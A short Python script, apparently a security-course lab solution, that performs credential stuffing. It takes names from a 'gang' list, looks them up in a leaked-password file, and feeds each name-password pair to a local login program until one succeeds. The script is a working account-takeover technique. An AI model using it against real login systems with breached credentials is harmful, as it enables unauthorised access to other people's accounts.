import time
import subprocess

def main():
    start_time = time.time()
    gang_names = set()

    with open("gang.txt") as gang_file:  # Assuming the file is a .txt file
        gang_names.update(line.strip() for line in gang_file)
        gang_names.discard("Bonnie")
        gang_names.discard("Adam")

    with open("PwnedPWfile.txt") as pw_file:  # Assuming the file is a .txt file
        for line in pw_file:
            name, password = line.split(",")
            if name in gang_names:
                password = password.strip()  # Fixed indentation and syntax
                result2 = subprocess.run(['python3', 'Login.pyc', name, password], capture_output=True, text=True)
                if "success" in result2.stdout:
                    print(name, password)
                    break  # This break will only exit the inner loop

    end_time = time.time()
    elapsed_time = end_time - start_time
    print(elapsed_time)

if __name__ == "__main__":
    main()
